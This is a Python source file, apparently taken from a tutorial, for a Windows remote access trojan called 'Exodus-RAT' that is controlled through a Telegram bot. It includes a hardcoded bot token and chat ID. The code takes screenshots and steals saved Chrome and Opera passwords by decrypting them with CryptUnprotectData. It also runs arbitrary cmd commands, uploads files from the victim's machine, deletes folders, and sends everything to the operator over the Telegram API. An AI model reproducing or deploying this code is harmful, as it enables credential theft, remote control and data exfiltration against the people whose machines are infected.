# https://teletype.in/@exploit_dar/ByqP_MZkS

# pip install pyTelegramBotAPI
# pip install pywin32 или pip install win32crypt
# pip install Pillow
# pip install telebot

import telebot  # Для работы с ботом
import os  # Для работы с директориями / файлами
import requests  # Для отправки документов / скринов
from PIL import ImageGrab  # Для получения скриншота
import shutil  # Для копирования файлов Login Data
import sqlite3  # Для работы с БД, где хранятся пароли
import win32crypt  # Для расшифровки паролей
import subprocess  # Для завершения процесса
import platform  # Для получения информации о ПК
import webbrowser  # Для открытия ссылки в браузере

# Переменные для бота:
bot_token = "5416667430:AAFIkaLXaxd2nNaW7S4VUtTyjBIFUVNipS0"  # Токен от бота
chat_id = "5195681649"  # ID чата

bot = telebot.TeleBot(bot_token)  # Дополнительная переменная для обработки команд


# Перейдём к обработке первой команды - /start:
@bot.message_handler(commands=['start', 'Start'])  # Ждём команды Start / start
def send_message(command):  # Если команду выполнили
    bot.send_message(chat_id, "☣ Exodus-RAT Running ☣" +
                     "\n\nЧтобы узнать команды введи команду /commands" +
                     "\nCoded by 3xpl01t | @darkside_team")  # Посылаем сообщение


# Ну и сразу добавим обработку команды /commands:
@bot.message_handler(commands=['help', 'commands', 'Help', 'Commands'])  # КОМАНДЫ
def send_message(command):
    bot.send_message(chat_id,
                     "Команды: "
                     "\n /Screen - Скриншот экрана "
                     "\n /Info - Инфо о юзере "
                     "\n /kill_process name.exe - Убить процесс по имени" +
                     "\n /Pwd - Узнать текущую директорию "
                     "\n /passwords chrome - Пароли гугл хром "
                     "\n /passwords opera - Пароли опера" +
                     "\n /Cmd command - Выполнить команду в cmd  "
                     "\n /Open_url - Открыть ссылку "
                     "\n /Ls - все папки и файлы в директории" +
                     "\n /Cd folder - перейти в папку "
                     "\n /Download - скачать файл "
                     "\n /Rm_dir - удалить папку" +
                     "\n\n /About - о RAT'e")


# Сделаем обработку команды /Screen для получения скриншота экрана:
@bot.message_handler(commands=['screen', 'Screen'])  # Ждём команды
def send_screen(command):
    bot.send_message(chat_id, "Wait...")  # Отправляем сообщение "Wait..."
    screen = ImageGrab.grab()  # Создаём переменную, которая равна получению скриншота
    screen.save(os.getenv("APPDATA") + '\\Sreenshot.jpg')  # Сохраняем скриншот в папку AppData
    screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb')  # Обновляем переменную
    files = {'photo': screen}  # Создаём переменную для отправки POST запросом
    requests.post("https://api.telegram.org/bot" + bot_token + "/sendPhoto?chat_id=" + chat_id, files=files)  # Запрос


# Получение паролей
# для этого создадим две отдельные функции, которые после команды вызовем и отправим файл с паролями.
def Chrome():
    text = 'Stealer coded by @darkside_team\n\n\nPasswords Chrome:' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data',
                     os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')

        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            login = result[1]
            url = result[0]
            if password != '':
                text += '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password + '\n'
    return text


file = open(os.getenv("APPDATA") + '\\passwords_chrome.txt', "w+")  #
file.write(str(Chrome()) + '\n')
file.close()


# И Opera:
def Opera():
    texto = 'Stealer coded by @darkside_team\n\n\nPasswords Opera:' + '\n'
    texto += 'URL | LOGIN | PASSWORD' + '\n'
    if os.path.exists(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data'):
        shutil.copy2(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data',
                     os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
        conn = sqlite3.connect(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            login = result[1]
            url = result[0]
            if password != '':
                texto += '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password + '\n'


file = open(os.getenv("APPDATA") + '\\passwords_opera.txt', "w+")
file.write(str(Opera()) + '\n')
file.close()


# Функции стиллинга готовы, теперь обработаем коммаду /passwords:
@bot.message_handler(commands=['passwords', 'Passwords'])  # ПАРОЛИ
def send_passwords(message):
    if ("{0}".format(message.text) == "/passwords chrome"):  # Если сообщение /passwords chrome
        try:  # Пробуем
            Chrome()  # Вызываем функцию
            bot.send_message(chat_id, "Wait...")
            files = {'document': open(os.getenv("APPDATA") + '\\passwords_chrome.txt', 'rb')}
            requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id, files=files)
        except:  # Если есть ошибки
            bot.send_message(chat_id, "Ошибка! Браузер запущен!")

    elif ("{0}".format(message.text) == "/passwords opera"):  # ИначеЕсли текст /passwords opera
        Opera()
        bot.send_message(chat_id, "Wait...")
        files = {'document': open(os.getenv("APPDATA") + '\\passwords_opera.txt', 'rb')}
        requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id, files=files)
    else:  # Иначе
        bot.send_message(chat_id, "Ошибка! Команда введена неправильно!")


# Теперь сделаем обработку команды /Info для получения информации:
@bot.message_handler(commands=['info', 'Info'])  # ИНФОРМАЦИЯ
def send_info(command):
    username = os.getlogin()  # Получаем имя пользователя

    r = requests.get('http://ip.42.pl/raw')  # Делаем GET запрос, чтобы узнать внешний IP
    IP = r.text  # Объявляем переменную IP
    windows = platform.platform()  # Получаем версию Windows
    processor = platform.processor()  # Получаем характеристики процессора
    # Отправляем сообщение с данными
    bot.send_message(chat_id, "PC: " + username + "\nIP: " + IP + "\nOS: " + windows + "\nProcessor: " + processor)


# Обработка команды /pwd:
@bot.message_handler(commands=['pwd', 'Pwd'])  # ДИРЕКТОРИЯ
def pwd(command):
    directory = os.path.abspath(os.getcwd())  # Получаем расположение
    bot.send_message(chat_id, "Текущая дериктория: \n" + (str(directory)))  # Отправляем сообщение


# Обработка команды /kill_process
@bot.message_handler(commands=["kill_process", "Kill_process"])  # ПРОЦЕССЫ
def kill_process(message):
    user_msg = "{0}".format(message.text)  # Переменная в которой содержится сообщение
    subprocess.call("taskkill /IM " + user_msg.split(" ")[1])  # Убиваем процесс по имени
    bot.send_message(chat_id, "Готово!")


# Обработка команды /cmd
@bot.message_handler(commands=["cmd", "Cmd"])  # CMD
def cmd_command(message):
    user_msg = "{0}".format(message.text)
    subprocess.Popen([r'C:\\Windows\\system32\\cmd.exe', user_msg.split(" ")[1]])  # Запускаем cmd
    bot.send_message(chat_id, "Готово!")


# Обработка команды /open_url
@bot.message_handler(commands=["open_url", "Open_url"])  # ОТКРЫТЬ ССЫЛКУ
def open_url(message):
    user_msg = "{0}".format(message.text)
    url = user_msg.split(" ")[1]  # Объявляем переменную, в которой содержится url
    webbrowser.open_new_tab(url)  # Открываем ссылку
    bot.send_message(chat_id, "Готово!")


# Обработка команды /ls
@bot.message_handler(commands=["ls", "Ls"])  # ВСЕ ФАЙЛЫ
def ls_dir(commands):
    dirs = '\n'.join(os.listdir(path="."))  # Обявим переменную dirs, в которой содержатся все папки и файлы.
    bot.send_message(chat_id, "Files: " + "\n" + dirs)


# Обработка команды /cd
@bot.message_handler(commands=["cd", "Cd"])  # ПЕРЕЙТИ В ПАПКУ
def cd_dir(message):
    user_msg = "{0}".format(message.text)
    path2 = user_msg.split(" ")[1]  # Переменная - папка
    os.chdir(path2)  # Меняем директорию
    bot.send_message(chat_id, "Директория изменена на " + path2)


# Обработка команды /download
@bot.message_handler(commands=["Download", "download"])  # ЗАГРУЗКА ФАЙЛА
def download_file(message):
    user_msg = "{0}".format(message.text)
    docc = user_msg.split(" ")[1]  # Переменная, в которой содержится имя файла
    doccc = {'document': open(docc, 'rb')}  # Переменная для POST запроса

    requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id,
                  files=doccc)  # Отправляем файл


# Обработка команды /rm_dir
@bot.message_handler(commands=["Rm_dir", "rm_dir"])  # УДАЛИТЬ ПАПКУ
def delete_dir(message):
    user_msg = "{0}".format(message.text)
    path2del = user_msg.split(" ")[1]  # Переменная - имя папка
    os.removedirs(path2del)  # Удаляем папку
    bot.send_message(chat_id, "Директория " + path2del + " удалена")


# Ну и последняя обработка /About
@bot.message_handler(commands=["About", "about"])  # ОПИСАНИЕ
def about(commands):
    bot.send_message(chat_id, "☣ Exodus-RAT v 1.0 ☣ \n\nCoder: @exploit_dar \nSpecial for @darkside_team :3")


# Последние, что мы добавим - запуск бота:
bot.polling()
